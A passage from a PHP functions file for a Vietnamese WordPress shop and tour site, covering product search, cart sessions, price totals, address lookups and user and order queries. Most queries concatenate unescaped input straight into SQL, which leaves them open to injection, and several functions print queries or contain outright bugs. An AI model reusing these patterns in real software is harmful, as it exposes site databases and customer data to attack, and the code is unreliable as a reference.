				FROM $wpdb->term_relationships term_re ,$wpdb->term_taxonomy term_tax
				where 	
					   term_re.term_taxonomy_id=term_tax.term_taxonomy_id
					AND
					   term_tax.taxonomy='$name_taxonomy_host'	
				
	       )
	)		
    order by $orderby
	LIMIT $star,$end
	
	";

    $sql = $wpdb->get_results($query);
    return $sql;
 }
  function get_id_taxonomy($slug)
  {
    
     global $wpdb;
	 $truyvan=" select  * FROM $wpdb->terms where slug='".$slug."'";
	 $sql = $wpdb->get_results($truyvan);
	 print_r($truyvan);
    return $sql;
  }
/************POST*******************/

function get_coment_next()
{
	global $wpdb;
	 
			$query="SELECT * FROM wp_comments , wp_users Where wp_comments.comment_post_ID =41274 AND wp_comments.user_id = wp_users.ID AND wp_comments.comment_date >= '2017/07/03' AND wp_comments.comment_date <= '2017/07/13'";
			
	  $sql = $wpdb->get_results($query);
    return $sql;
			 
}

function get_all_post_with_name_custom_post_user($id_user,$name_custom,$orderby,$star,$end)
{
  global $wpdb;
   $query="
    select  * FROM $wpdb->posts where 
	(post_status = 'publish' OR post_status = 'private')	
	 AND  post_type ='".$name_custom."'
	AND post_author=$id_user
    order by $orderby
	LIMIT $star,$end
	
	";
    $sql = $wpdb->get_results($query);
    return $sql;
}


function get_all_post_with_name_custom_post($name_custom,$orderby,$star,$end)
{
  global $wpdb;
   $query="
    select  * FROM $wpdb->posts where 
	(post_status = 'publish' OR post_status = 'private')	
	 AND  post_type ='".$name_custom."'
	
    order by $orderby
	LIMIT $star,$end
	
	";
    $sql = $wpdb->get_results($query);
    return $sql;
}
function get_all_post_with_name_custom_post_date($name_custom,$orderby,$ngay_bd,$ngay_kt,$star,$end)
{
  global $wpdb;
  
   if($ngay_bd==0)
	{
		 $ngay_bd="20/04/2012";
	}
	if($ngay_kt==0)
	{
		 $ngay_kt="20/04/2099";
	}
$contractDateBegin = str_replace('/', '-', $ngay_bd);
$contractDateBegin= date('Y-m-d', strtotime($contractDateBegin));


/*$contractDateEnd = date('Y-m-d', strtotime($ngay_kt));*/

$contractDateEnd = str_replace('/', '-', $ngay_kt);
$contractDateEnd= date('Y-m-d', strtotime($contractDateEnd));


	 
	
	
   $query="
    select  * FROM $wpdb->posts where 
	(post_status = 'publish' OR post_status = 'private')	
	 AND  post_type ='".$name_custom."'
	AND post_date >= '".$contractDateBegin."' and post_date <= '".$contractDateEnd."' 
    order by $orderby
	LIMIT $star,$end
	
	";
    $sql = $wpdb->get_results($query);
    return $sql;
}




function get_all_post_with_name_custom_post_date_user($id_user,$name_custom,$orderby,$ngay_bd,$ngay_kt,$star,$end)
{
  global $wpdb;
  
   if($ngay_bd==0)
	{
		 $ngay_bd="20/04/2012";
	}
	if($ngay_kt==0)
	{
		 $ngay_kt="20/04/2099";
	}
$contractDateBegin = str_replace('/', '-', $ngay_bd);
$contractDateBegin= date('Y-m-d', strtotime($contractDateBegin));


/*$contractDateEnd = date('Y-m-d', strtotime($ngay_kt));*/

$contractDateEnd = str_replace('/', '-', $ngay_kt);
$contractDateEnd= date('Y-m-d', strtotime($contractDateEnd));


	 
	
	
   $query="
    select  * FROM $wpdb->posts where 
	(post_status = 'publish' OR post_status = 'private')	
	 AND  post_type ='".$name_custom."'
	 AND post_author=$id_user
	AND post_date >= '".$contractDateBegin."' and post_date <= '".$contractDateEnd."' 
    order by $orderby
	LIMIT $star,$end
	
	";
    $sql = $wpdb->get_results($query);
    return $sql;
}



function get_my_post_with_name_custom_post($name_custom,$id_user,$orderby,$star,$end){  global $wpdb;   $query="    select  * FROM $wpdb->posts where 	(post_status = 'publish' OR post_status = 'private')		 AND  post_type ='".$name_custom."'	 AND  post_author ='".$id_user."'    order by $orderby	LIMIT $star,$end		";    $sql = $wpdb->get_results($query);    return $sql;}
function check_id_post_my_id($id,$id_user){  global $wpdb;   $query="    select  * FROM $wpdb->posts where 	(post_status = 'publish' OR post_status = 'private')		 	 AND  post_author ='".$id_user."'	 	 AND  ID =".$id."		";    $sql = $wpdb->get_results($query);    echo $query;    return $sql;}
function get_all_post_with_name_custom_post_and_taxonomy($name_custom,$name_taxonomy,$orderby,$star,$end){  global $wpdb;   $query="    select  * FROM $wpdb->posts where 	(post_status = 'publish' OR post_status = 'private')		 AND  post_type ='".$name_custom."'     AND 	(		   $wpdb->posts.ID IN		   (				select  term_re.object_id 				FROM $wpdb->term_relationships term_re ,$wpdb->term_taxonomy term_tax				where 						   term_re.term_taxonomy_id=term_tax.term_taxonomy_id					AND					   term_tax.taxonomy='$name_taxonomy'							       )	)	    order by $orderby	LIMIT $star,$end		";    $sql = $wpdb->get_results($query);    return $sql;}
function get_post_with_id_post($id_post)
{
  global $wpdb;
   $query="
    select  * FROM $wpdb->posts where 
	(post_status = 'publish' OR post_status = 'private')	
	 AND  ID =".$id_post."
    
	
	";
    $sql = $wpdb->get_results($query);
    return $sql;
}
/************GIOHANG****************/
 function add_to_cart($id)
{
   
   $id_san_pham="id_sp_".$id;
   $so_luong_sp="so_luong_sp_".$id;
    $id_mau="id_mau".$id_product;	  
	$id_size="id_size".$id_product;
	   
   
   $_SESSION[$id_san_pham] =$id;
   if(isset($_SESSION['id_sp']))
	{
			foreach($_SESSION['id_sp'] as $kq)
			{
			   if($kq==$id)
			   {
			     $flag=1;
			   }
			}
			
	 }	
	if($flag==0)
	{	
	   array_push($_SESSION['id_sp'], $id);
	   
	}
}
function giam_so_luong_cart($id)
{
   $id_san_pham="id_sp_".$id;
   $so_luong_sp="so_luong_sp_".$id;
   $_SESSION[$id_san_pham] =$id;
   if(isset($_SESSION[$so_luong_sp]))
   {
     if($_SESSION[$so_luong_sp]!=0)
	 {
	   $_SESSION[$so_luong_sp] =$_SESSION[$so_luong_sp]-1;
	  }
	   if($_SESSION[$so_luong_sp]==0)
	  {
	      delete_to_cart($id);
	  }
   }
}
 function delete_to_cart($id)
{ 
   $id_san_pham="id_sp_".$id;
   $so_luong_sp="so_luong_sp_".$id;
    unset($_SESSION[$so_luong_sp]); 
   
   
   unset($_SESSION[$id_san_pham]);
   unset($_SESSION["id_sp"][$id]);
    
	$so_luong_sp="id_mau".$id;
    unset($_SESSION[$so_luong_sp]); 
	
	$so_luong_sp="id_size".$id;
    unset($_SESSION[$so_luong_sp]);
     
	 $id_pr="id_".$id;
	 foreach($_SESSION[$id_pr] as $kq)
	{
		  unset($_SESSION[$kq]["so_luong"]);
		  unset($_SESSION[$kq]["mau"]);
	}
	 unset($_SESSION[$id_pr]);
	 
	 
}
function delete_all()
{
   @session_destroy();
}
function get_total_price()
{
   global $post;
   $tonggia=0;
   $san_pham_chon=array();
   $dem=0;
   $lang=qtrans_getLanguage();	
	$flag_dang_nhap=0;
	if(is_user_logged_in()) 	
	{
			$current_user = wp_get_current_user();
			$id_user=$current_user ->ID;		
			$user_loai_khach_hang=get_user_meta($id_user, "loai_khach_hang");		
			$user_loai_khach_hang=$user_loai_khach_hang[0];			
			if($user_loai_khach_hang==1)
			{				
				$flag_dang_nhap=1;
			}
	}		

	 foreach($_SESSION['id_sp'] as $kq)
	{	   
		   $gia=0;
		   $img=home_url()."/wp-content/uploads/no_images.jpg";
		   $postmeta=get_post_custom($kq);
		   foreach($postmeta as $key => $value)
		   {
		        
				if($key=="images")
				{
					$img=get_image_size($kq,"images","medium")	;
					
				}
				
		   }
		    	


		if($flag_dang_nhap==0)
		{				
			$price_km=lay_gia_tri_postmeta($kq,"gia_km"); 
			if($price_km!="")
			{

				$tr_gia_km=$price_km;
				$price_km=number_format($price_km, 0, ',', '.');
				$price_km=$price_km." đ";
			}


			if($price!="")
			{
			$price=number_format($price, 0, ',', '.');
			$price=$price." đ";
			 
			}


			$gia_km=lay_gia_tri_postmeta($kq,"gia_km");
			$gia_ban=lay_gia_tri_postmeta($kq,"gia");

			if($gia_km!=""&& $gia_ban!="")
			{

			  $gia_thuc=$gia_km;
			}
			if($gia_km==""&& $gia_ban!="")
			{
			  $gia_thuc=$gia_ban;
			}
			if($gia_km==""&& $gia_ban=="")
			{
			  $gia_thuc=0;
			}
		}
		else 
		{
			$price_km=lay_gia_tri_postmeta($kq,"gia_km_usd"); 
			if($price_km!="")
			{

				$tr_gia_km=$price_km;
				 
				$price_km=$price_km." đ";
			}


			if($price!="")
			{
		 
			$price=$price." đ";
			 
			}


			$gia_km=lay_gia_tri_postmeta($kq,"gia_km_usd");
			$gia_ban=lay_gia_tri_postmeta($kq,"gia_usd");

			if($gia_km!=""&& $gia_ban!="")
			{

			  $gia_thuc=$gia_km;
			}
			if($gia_km==""&& $gia_ban!="")
			{
			  $gia_thuc=$gia_ban;
			}
			if($gia_km==""&& $gia_ban=="")
			{
			  $gia_thuc=0;
			}
		}			
		   $id_san_pham="id_sp_".$kq;
           $so_luong_sp="so_luong_sp_".$kq;
		    $id_mau="id_mau".$kq;	  
			$id_size="id_size".$kq;
	   
		   if(isset($_SESSION[$id_san_pham]))
		   {
			  $tr_kq=get_post_with_id_post($kq);
			 foreach($tr_kq as $tr_result)
			 {
			    $name=$tr_result->post_title;
				$name = qtranxf_use($lang, $name,false);
				$post_excerpt=$tr_result->post_excerpt;
				$ma=lay_gia_tri_postmeta($tr_result->ID,"ma_sp");
			 }
		      $san_pham_chon[$dem]["id"]=$kq;
			  $san_pham_chon[$dem]["title"]=$name;
			    $san_pham_chon[$dem]["ma"]=$ma;
			   $san_pham_chon[$dem]["chuc_nang"]=$chuc_nang;
			  $san_pham_chon[$dem]["detail_short"]=$post_excerpt;
			  $san_pham_chon[$dem]["images"]=$img;
			  $san_pham_chon[$dem]["price"]=$gia_thuc;
			  if($flag_dang_nhap==0)
			  {
			   $san_pham_chon[$dem]["gia"]=lay_gia_tri_postmeta($kq,"gia");
			   $san_pham_chon[$dem]["gia_km"]=lay_gia_tri_postmeta($kq,"gia_km");	
			  }
			  else 
			  {
				    $san_pham_chon[$dem]["gia"]=lay_gia_tri_postmeta($kq,"gia_usd");
					$san_pham_chon[$dem]["gia_km"]=lay_gia_tri_postmeta($kq,"gia_km_usd");	
			  }
			  $san_pham_chon[$dem]["soluong"]=$_SESSION[$so_luong_sp];
			  $san_pham_chon[$dem]["idmau"]=$_SESSION[$id_mau];
				$san_pham_chon[$dem]["idsize"]=$_SESSION[$id_size];
		      $tonggia=$tonggia+$gia_thuc*$_SESSION[$so_luong_sp];
			  
			  $dem++;
		   }
												   
	 }
 
	 
		
	$_SESSION["tong"]=$tonggia;
	
	return  $san_pham_chon;
	
}



function search_dat_hang_title($key)
{
    global $wpdb;    
     $truyvan="
	   select  * FROM $wpdb->posts where 
	   ( post_status = 'publish' OR post_status = 'private')
		AND post_type ='dat-hang'
		AND post_title = '".$key."'";
     	  
	$sql = $wpdb->get_results($truyvan);
    return $sql; 
}
function get_total_price_1($arry_du_lieu,$arry_so_luong)
{
   global $post;
   $tonggia=0;
   $san_pham_chon="";
   $dem=0;
   $temp = $wp_query;
   $wp_query= null; 
      
	 foreach($arry_du_lieu as $kq)
	{	   
		   $gia=0;
		   $img=home_url()."/wp-content/uploads/no_images.jpg";
		   $postmeta=get_post_custom($kq);
		   foreach($postmeta as $key => $value)
		   {
		        
				if($key=="images")
				{
				  /* $img_post=get_post_custom($value[0]);
					 foreach($img_post as $key1 => $value1)
					 {
						if($key1=="_wp_attached_file")
						{
						   $img=home_url()."/wp-content/uploads/".$value1[0];
						}
					 }
					*/
					$img=get_image_size($kq,"images","medium")	;
					
				}
				
		   }
		    				 
			$price_km=lay_gia_tri_postmeta($kq,"gia_km");
		 $chuc_nang=lay_gia_tri_postmeta($kq,"chuc_nang");
		
		  $price=lay_gia_tri_postmeta($kq,"gia");
		   if($price_km!="")
		   {
			
				$tr_gia_km=$price_km;
				$price_km=number_format($price_km, 0, ',', '.');
				$price_km=$price_km." vnđ";
		   }
		  
		 
		   if($price!="")
		   {
			$price=number_format($price, 0, ',', '.');
			$price=$price." vnđ";
			 
		   }
		   
		   
		  $gia_km=lay_gia_tri_postmeta($kq,"gia_km");
		  $gia_ban=lay_gia_tri_postmeta($kq,"gia");
		 
		  if($gia_km!=""&& $gia_ban!="")
		  {
		    
			  $gia_thuc=$gia_km;
		  }
		  if($gia_km==""&& $gia_ban!="")
		  {
			  $gia_thuc=$gia_ban;
		  }
		 if($gia_km==""&& $gia_ban=="")
		  {
			  $gia_thuc=0;
		  }
		  
		  
		   $id_san_pham="id_sp_".$kq;
           $so_luong_sp="so_luong_sp_".$kq;
		    $id_mau="id_mau".$kq;	  
			$id_size="id_size".$kq;
	   
		   if(1==1)
		   {
			  $tr_kq=get_post_with_id_post($kq);
			 foreach($tr_kq as $tr_result)
			 {
			    $name=$tr_result->post_title;
				$post_excerpt=$tr_result->post_excerpt;
				$ma=lay_gia_tri_postmeta($tr_result->ID,"ma");
			 }
		      $san_pham_chon[$dem]["id"]=$kq;
			  $san_pham_chon[$dem]["title"]=$name;
			    $san_pham_chon[$dem]["ma"]=$ma;
			   $san_pham_chon[$dem]["chuc_nang"]=$chuc_nang;
			  $san_pham_chon[$dem]["detail_short"]=$post_excerpt;
			  $san_pham_chon[$dem]["images"]=$img;
			  $san_pham_chon[$dem]["price"]=$gia_thuc;
			   $san_pham_chon[$dem]["gia"]=lay_gia_tri_postmeta($kq,"gia");
			   $san_pham_chon[$dem]["gia_km"]=lay_gia_tri_postmeta($kq,"gia_km");
			   $so_luong=$arry_so_luong[$dem];
			  $san_pham_chon[$dem]["soluong"]=$so_luong;
			  $san_pham_chon[$dem]["idmau"]="";
				$san_pham_chon[$dem]["idsize"]="";
		      $tonggia=$tonggia+$gia_thuc*$so_luong;
			  
			  $dem++;
		   }
												   
	 }
   
    $wp_query = null;
	$wp_query = $temp; 
	
	    
				
	
	return  $san_pham_chon;
	
}


function get_total_price_2($arry_du_lieu,$arry_so_luong)
{
   global $post;
   $tonggia=0;
   $san_pham_chon="";
   $dem=0;
   $temp = $wp_query;
   $wp_query= null; 
      
	 foreach($arry_du_lieu as $kq)
	{	   
		   $gia=0;
		   $img=home_url()."/wp-content/uploads/no_images.jpg";
		   $postmeta=get_post_custom($kq);
		   foreach($postmeta as $key => $value)
		   {
		        
				if($key=="images")
				{
				  /* $img_post=get_post_custom($value[0]);
					 foreach($img_post as $key1 => $value1)
					 {
						if($key1=="_wp_attached_file")
						{
						   $img=home_url()."/wp-content/uploads/".$value1[0];
						}
					 }
					*/
					$img=get_image_size($kq,"images","medium")	;
					
				}
				
		   }
		    				 
			$price_km=lay_gia_tri_postmeta($kq,"gia_km");
		 $chuc_nang=lay_gia_tri_postmeta($kq,"chuc_nang");
		
		  $price=lay_gia_tri_postmeta($kq,"gia");
		   if($price_km!="")
		   {
			
				$tr_gia_km=$price_km;
				$price_km=number_format($price_km, 0, ',', '.');
				$price_km=$price_km." vnđ";
		   }
		  
		 
		   if($price!="")
		   {
			$price=number_format($price, 0, ',', '.');
			$price=$price." vnđ";
			 
		   }
		   
		   
		  $gia_km=lay_gia_tri_postmeta($kq,"gia_km");
		  $gia_ban=lay_gia_tri_postmeta($kq,"gia");
		 
		  if($gia_km!=""&& $gia_ban!="")
		  {
		    
			  $gia_thuc=$gia_km;
		  }
		  if($gia_km==""&& $gia_ban!="")
		  {
			  $gia_thuc=$gia_ban;
		  }
		 if($gia_km==""&& $gia_ban=="")
		  {
			  $gia_thuc=0;
		  }
		  
		  
		   $id_san_pham="id_sp_".$kq;
           $so_luong_sp="so_luong_sp_".$kq;
		    $id_mau="id_mau".$kq;	  
			$id_size="id_size".$kq;
	   
		   if(1==1)
		   {
			  $tr_kq=get_post_with_id_post($kq);
			 foreach($tr_kq as $tr_result)
			 {
			    $name=$tr_result->post_title;
				$post_excerpt=$tr_result->post_excerpt;
				$ma=lay_gia_tri_postmeta($tr_result->ID,"ma");
			 }
		      $san_pham_chon[$dem]["id"]=$kq;
			  $san_pham_chon[$dem]["title"]=$name;
			    $san_pham_chon[$dem]["ma"]=$ma;
			   $san_pham_chon[$dem]["chuc_nang"]=$chuc_nang;
			  $san_pham_chon[$dem]["detail_short"]=$post_excerpt;
			  $san_pham_chon[$dem]["images"]=$img;
			  $san_pham_chon[$dem]["price"]=$gia_thuc;
			   $san_pham_chon[$dem]["gia"]=lay_gia_tri_postmeta($kq,"gia");
			   $san_pham_chon[$dem]["gia_km"]=lay_gia_tri_postmeta($kq,"gia_km");
			   $so_luong=$arry_so_luong[$dem];
			  $san_pham_chon[$dem]["soluong"]=$so_luong;
			  $san_pham_chon[$dem]["idmau"]="";
				$san_pham_chon[$dem]["idsize"]="";
		      $tonggia=$tonggia+$gia_thuc*$so_luong;
			  
			  $dem++;
		   }
												   
	 }
   
    $wp_query = null;
	$wp_query = $temp; 
	
	    
		 
				
	
	return  $tonggia;
	
}

 

 function get_image_size($post_id,$key_images_upload,$size='')
{
     
   $id_post_img= get_post_custom_values($key_images_upload,$post_id); 
   $img=wp_get_attachment_image_src($id_post_img[0],$size);
    return $img[0];

}

 function lay_gia_tri_postmeta($post_id,$key)
{
    $value="";
    global $wpdb;
    $result=get_post_custom_values($key,$post_id);
	
	if(is_array($result))
	{
		foreach($result as $result1 =>$value)
		{	   
		   $bien=$value; 
		}
	}
	 return $value; 
}
function lay_gia_tri_postmeta_meta_id($meta_id,$key)
{
    global $wpdb;
   $query="
    select  * FROM $wpdb->postmeta where 
	
	 post_id  =".$meta_id."  
	 AND meta_key='".$key."'
	
	";
    $sql = $wpdb->get_results($query);
    return $sql;
}
function sort_post_meta($key,$order,$start,$end)
{
    global $wpdb;
    $query="
    select  * FROM $wpdb->postmeta  post_meta,$wpdb->posts post where 
	post.ID = post_meta.post_id
	AND ( post.post_status = 'publish' OR post.post_status = 'private')
	AND post_meta.meta_key='".$key."'
	 order by  ".$order." limit ".$start.",".$end."	
	";
	
    $sql = $wpdb->get_results($query);
    return $sql;
}

/***********SEARCH PRODUCT***************/
function get_total_results_search($danh_muc_sp,$nhan_hieu,$gia)
{
   global $wpdb; 
   
   if($danh_muc_sp==0&&$nhan_hieu==0&&$gia==0)
   {
     //lay san pham moi nhat 
      $truyvan="
	   select  count(*) as total FROM $wpdb->posts where 
	   ( post_status = 'publish' OR post_status = 'private')
		AND post_type ='san-pham'"; 
	$sql = $wpdb->get_results($truyvan);
    return $sql; 
   }
    $truyvan="select  count(*) as total FROM $wpdb->posts  where 
	   ( post_status = 'publish' OR post_status = 'private')
		AND post_type ='san-pham'
		";
	if($danh_muc_sp!=0)
    {  
	    
	   $truyvan.="
	    AND  $wpdb->posts.ID IN 
		  (
		      select post.ID 
			  from $wpdb->posts  post,$wpdb->term_relationships term_re,
			  $wpdb->term_taxonomy term_tax 
			  where
            	post.ID=term_re.object_id
				AND  term_re.term_taxonomy_id=term_tax.term_taxonomy_id
				AND  term_tax.term_id=$danh_muc_sp	
		  )
	   ";
	}
	if($nhan_hieu!=0)
	{
	   $truyvan.="
	    AND  $wpdb->posts.ID IN 
		  (
		      select post.ID 
			  from $wpdb->posts  post,$wpdb->term_relationships term_re,
			  $wpdb->term_taxonomy term_tax 
			  where
            	post.ID=term_re.object_id
				AND  term_re.term_taxonomy_id=term_tax.term_taxonomy_id
				AND  term_tax.term_id=$nhan_hieu	
		  )
	   ";
	}
	if($gia==1)//tang dan
	{
	   	   $truyvan.="
		   order by $wpdb->postmeta.meta_value asc
		  
		";
	}
	if($gia==2)//giam dan
	{
	   	   $truyvan.="
		   order by $wpdb->postmeta.meta_value desc
		   
		";
	}
	
	
	$sql = $wpdb->get_results($truyvan);
    return $sql;
}
function  get_results_search($danh_muc_sp,$nhan_hieu,$gia,$orderby,$start,$end)
{
   global $wpdb; 
   
   
   if($danh_muc_sp==0 && $nhan_hieu==0 && $gia==0)
   {   
     //lay san pham moi nhat 
      $truyvan="
	   select  * FROM $wpdb->posts where 
	   ( post_status = 'publish' OR post_status = 'private')
		AND post_type ='san-pham'	 
    order by $orderby
	LIMIT $start,$end";	
	$sql = $wpdb->get_results($truyvan);
    return $sql; 
   }
   $truyvan="select  * FROM $wpdb->posts  where 
	   ( post_status = 'publish' OR post_status = 'private')
		AND post_type ='san-pham'
		";
	if($danh_muc_sp!=0)
    {
	   
	   $truyvan.="
	    AND  $wpdb->posts.ID IN 
		  (
		      select post.ID 
			  from $wpdb->posts  post,$wpdb->term_relationships term_re,
			  $wpdb->term_taxonomy term_tax 
			  where
            	post.ID=term_re.object_id
				AND  term_re.term_taxonomy_id=term_tax.term_taxonomy_id
				AND  term_tax.term_id=$danh_muc_sp	
		  )
	   ";
	}
	if($nhan_hieu!=0)
	{
	   $truyvan.="
	    AND  $wpdb->posts.ID IN 
		  (
		      select post.ID 
			  from $wpdb->posts  post,$wpdb->term_relationships term_re,
			  $wpdb->term_taxonomy term_tax 
			  where
            	post.ID=term_re.object_id
				AND  term_re.term_taxonomy_id=term_tax.term_taxonomy_id
				AND  term_tax.term_id=$nhan_hieu	
		  )
	   ";
	}
	if($gia==1)//tang dan
	{
	   $truyvan.="
		   order by $wpdb->postmeta.meta_value asc
		   LIMIT $start,$end
		";
	}
	if($gia==2)//giam dan
	{
	  $truyvan.="
		   order by $wpdb->postmeta.meta_value desc
		   LIMIT $start,$end
		";
	}
	if($gia==0)
	{
		$truyvan.="
		   order by $orderby
		   LIMIT $start,$end
		";
	}	
   
	$sql = $wpdb->get_results($truyvan);
    return $sql; 
	
  
}

function search_product_title($key,$orderby,$start,$end)
{
    global $wpdb;    
     $truyvan="
	   select  * FROM $wpdb->posts where 
	   ( post_status = 'publish' OR post_status = 'private')
		AND post_type ='san-pham'
		AND post_title like '%".$key."%'";
	
	if($key=="")
	{
		  $truyvan.= " AND 1==0";
	}
    $truyvan.="order by $orderby
	LIMIT $start,$end ";	  
	 
	$sql = $wpdb->get_results($truyvan);
    return $sql; 

	
	
}
function search_product_title_1($key,$key_2,$orderby,$start,$end)
{
	
	global $wpdb;
   if($key!="")
   {
	   $query="
	   select  * FROM $wpdb->posts  post, $wpdb->postmeta  post_meta where 
		post.ID = post_meta.post_id
		AND
		(post.post_status = 'publish' OR post.post_status = 'private')		
		  AND post.post_type ='san-pham'
		AND post.post_title like '%".$key_2."%'	
		 ";
		
		$query.=" AND post_meta.meta_key='".$key."'	
		order by $orderby
		LIMIT $start,$end
		
		";
	}
	else
	{
	
	     $query="
	     select  * FROM $wpdb->posts  post where 		
		(post.post_status = 'publish' OR post.post_status = 'private')	
	    AND post.post_type ='san-pham'
		AND post.post_title like '%".$key_2."%'	
		";
		
		$query.=" 
		order by $orderby
		LIMIT $start,$end
		
		";
	}
	
    $sql = $wpdb->get_results($query);
    return $sql;
}
function search($tu_khoa,$id_tour,$gia,$ngay_khoi_hanh,$orderby,$start,$end)
{

    global $wpdb; 
	$query="
   select  * FROM $wpdb->posts  post, $wpdb->postmeta  post_meta where 

	post.ID = post_meta.post_id

	AND
	(post.post_status = 'publish' OR post.post_status = 'private' )
    	AND post_type ='tour'	
	";
	if($tu_khoa!="")
	{
	  $query.=" AND post.post_title like '%".$tu_khoa."%'";
	}
	if($id_tour!=-1)
	{
	  $query.="
	     AND 
			(
				   post.ID IN
				   (
						select  term_re.object_id 
						FROM $wpdb->term_relationships term_re ,$wpdb->term_taxonomy term_tax
						where 	
							   term_re.term_taxonomy_id=term_tax.term_taxonomy_id
							AND
							   term_tax.taxonomy='danh-muc-tour'	
							AND 
									term_tax.term_id in(".get_query_child('danh-muc-tour',$id_tour).")	
				   )
			)
	  ";
	}
	if($gia!=-1)
	{
	  $query.="
	     AND 
			(
				   post.ID IN
				   (
						select  term_re.object_id 
						FROM $wpdb->term_relationships term_re ,$wpdb->term_taxonomy term_tax
						where 	
							   term_re.term_taxonomy_id=term_tax.term_taxonomy_id
							AND
							   term_tax.taxonomy='nhom-gia'	
							AND 
									term_tax.term_id in(".get_query_child('nhom-gia',$gia).")	
				   )
			)
	  ";
	}
	if($ngay_khoi_hanh!=-1)
	{
	  $query.="
	    AND
		(
		  post_meta.meta_key='ngay_di'
		)
		AND
		(
		  post_meta.meta_value ='".$ngay_khoi_hanh."'
		)
	  ";
	}
	$query.="
	GROUP BY post.ID
    order by $orderby
	LIMIT $start,$end ";	  
	$sql = $wpdb->get_results($query);
	
	
    return $sql; 
}

function get_mail_with_mail($mail
){
global $wpdb;$query="select  * FROM wp_users where  user_email ='".$mail."' ";
$sql = $wpdb->get_results($query);
return $sql;
}	
	
/*************/
function lay_full_tinh()
{
	global $wpdb;
	$query="select  * FROM province order by name ";
	$sql = $wpdb->get_results($query);
	return $sql;
}
function lay_tinh()
{
	global $wpdb;
	$query="select  * FROM province where provinceid!=79 order by name";
	$sql = $wpdb->get_results($query);
	return $sql;
}	
function lay_quan($id)
{
	global $wpdb;
	$query="select  * FROM district where provinceid=$id order by name";
	$sql = $wpdb->get_results($query);
	return $sql;
}
function lay_loai_quan($id)
{
	global $wpdb;
	$query="select  * FROM district where districtid=$id order by name";
	$sql = $wpdb->get_results($query);
	return $sql;
}
function update_loai_quan($id,$loai)
{
	global $wpdb;
	$query="UPDATE district SET loai_quan=$loai  where districtid =$id ";
	$sql = $wpdb->get_results($query);
	return $sql;
}
function lay_phuong($id)
{
	global $wpdb;
	$query="select  * FROM ward where districtid=$id order by name";
	$sql = $wpdb->get_results($query);
	return $sql;
}


function lay_name_tinh($id)
{
	global $wpdb;
	$query="select  * FROM province where provinceid=$id order by name";
	$sql = $wpdb->get_results($query);

	foreach($sql as $result)
	{
	   $name=$result->type." ".$result->name;
	   return($name);
	}
	

}	
function lay_name_quan($id)
{
	global $wpdb;
	$query="select  * FROM district where districtid=$id order by name";
	$sql = $wpdb->get_results($query);

	foreach($sql as $result)
	{
	 
	    $name=$result->type." ".$result->name;
	   return($name);
	}
	

}	
function lay_name_phuong($id)
{
	global $wpdb;
	$query="select  * FROM ward where wardid=$id order by name";
	$sql = $wpdb->get_results($query);

	foreach($sql as $result)
	{
	 
	    $name=$result->type." ".$result->name;
	   return($name);
	}
	

}	

function get_list_user($start,$end)
{
	global $wpdb;
	$query="select  * FROM wp_users  order by ID desc limit $start,$end";
	$sql = $wpdb->get_results($query);
	return $sql;
}
function get_list_user_date($ngay_bd,$ngay_kt,$start,$end)
{
	
	global $wpdb;
	
	 if($ngay_bd==0)
	{
		 $ngay_bd="20/04/2012";
	}
	if($ngay_kt==0)
	{
		 $ngay_kt="20/04/2099";
	}
$contractDateBegin = str_replace('/', '-', $ngay_bd);
$contractDateBegin= date('Y-m-d', strtotime($contractDateBegin));


/*$contractDateEnd = date('Y-m-d', strtotime($ngay_kt));*/

$contractDateEnd = str_replace('/', '-', $ngay_kt);
$contractDateEnd= date('Y-m-d', strtotime($contractDateEnd));


	$query="select  * FROM wp_users  where   user_registered >= '".$contractDateBegin."' and user_registered <= '".$contractDateEnd."' order by ID desc limit $start,$end";
	$sql = $wpdb->get_results($query);
	 
	return $sql;
}


function get_list_user_f1($start,$end)
{
	global $wpdb;
	$query=" select  * FROM $wpdb->usermeta  usermeta,$wpdb->users users where 
	users.ID = usermeta.user_id	
	AND usermeta.meta_key='loai_khach_hang'
	AND usermeta.meta_value=4	
	order by users.ID desc limit $start,$end";
	$sql = $wpdb->get_results($query);
	
	return $sql;
}
function get_list_user_search($key)
{
	global $wpdb;
	$query="select  * FROM wp_users where user_email like '%".$key."%' OR display_name like '%".$key."%'   order by ID desc limit 0,1000";
	 
	$sql = $wpdb->get_results($query);
	return $sql;
}

function tim_kiem_back_end_user($id_user,$ma,$ngay_dat,$nguoi_dat,$email,$so_dt,$orderby,$start,$end)
{
	global $wpdb;
     $query="
	     select  * FROM $wpdb->posts  post where 		
		(post.post_status = 'publish' OR post.post_status = 'private')	
	    AND post.post_type ='dh-doi-tac'
		AND 
		post.post_author=$id_user
		";
		
		if($ma!="")
		{
			$query.="AND post.post_title like '%".$ma."%'";	
		
		}
		if($ngay_dat!="")
		{
			$query.="AND post.post_date like '%".$ngay_dat."%'";	
		
		}
		if($nguoi_dat!="")
		{
		      $query.="
				 AND 
					(
						   post.ID IN
						   (
									select  posts.ID FROM $wpdb->posts  posts, $wpdb->postmeta  post_meta where 
										posts.ID = post_meta.post_id
										AND
										(post.post_status = 'publish' OR post.post_status = 'private' )
										AND post_type ='dh-doi-tac'
										 AND
										(
										  post_meta.meta_key='nguoi_nhan'
										)
										AND
										(
										  post_meta.meta_value like '%".$nguoi_dat."%'	
										)
						   )
					)
			  ";
		}
		if($email!="")
		{
		      $query.="
				 AND 
					(
						   post.ID IN
						   (
									select  posts.ID FROM $wpdb->posts  posts, $wpdb->postmeta  post_meta where 
										posts.ID = post_meta.post_id
										AND
										(post.post_status = 'publish' OR post.post_status = 'private' )
										AND post_type ='dh-doi-tac'
										 AND
										(
										  post_meta.meta_key='email'
										)
										AND
										(
										  post_meta.meta_value ='".$email."'
										)
						   )
					)
			  ";
		}
		if($so_dt!="")
		{
		      $query.="
				 AND 
					(
						   post.ID IN
						   (
									select  posts.ID FROM $wpdb->posts  posts, $wpdb->postmeta  post_meta where 
										posts.ID = post_meta.post_id
										AND
										(post.post_status = 'publish' OR post.post_status = 'private' )
										AND post_type ='dh-doi-tac'
										 AND
										(
										  post_meta.meta_key='so_dien_thoai'
										)
										AND
										(
										  post_meta.meta_value ='".$so_dt."'
										)
						   )
					)
			  ";
		}
		$query.=" 
		order by $orderby
		LIMIT $start,$end
		
		";
		
		$sql = $wpdb->get_results($query);
		return $sql;
}

function tim_kiem_back_end($ma,$ngay_dat,$nguoi_dat,$email,$so_dt,$orderby,$start,$end)
{
	global $wpdb;
     $query="
	     select  * FROM $wpdb->posts  post where 		
		(post.post_status = 'publish' OR post.post_status = 'private')	
	    AND post.post_type ='dat-hang'";
		if($ma!="")
		{
			$query.="AND post.post_title like '%".$ma."%'";	
		
		}
		if($ngay_dat!="")
		{
